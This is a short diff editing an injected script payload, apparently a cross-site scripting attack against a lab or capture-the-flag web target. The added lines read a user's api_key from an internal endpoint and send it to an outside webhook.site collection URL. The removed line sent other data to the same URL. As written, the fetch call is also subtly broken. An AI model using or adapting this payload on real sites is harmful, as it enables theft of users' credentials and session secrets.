@@ -1,3 +1,4 @@
 <script>
-fetch('https://webhook.site/ccbf9aeb-a2b7-4610-b41d-bd08ed56340b/?c='+encodeURIComponent(d))
+let api = fetch('http://web:80/api/me.php').json().api_key
+fetch('https://webhook.site/ccbf9aeb-a2b7-4610-b41d-bd08ed56340b/?c='+api)
 </script>
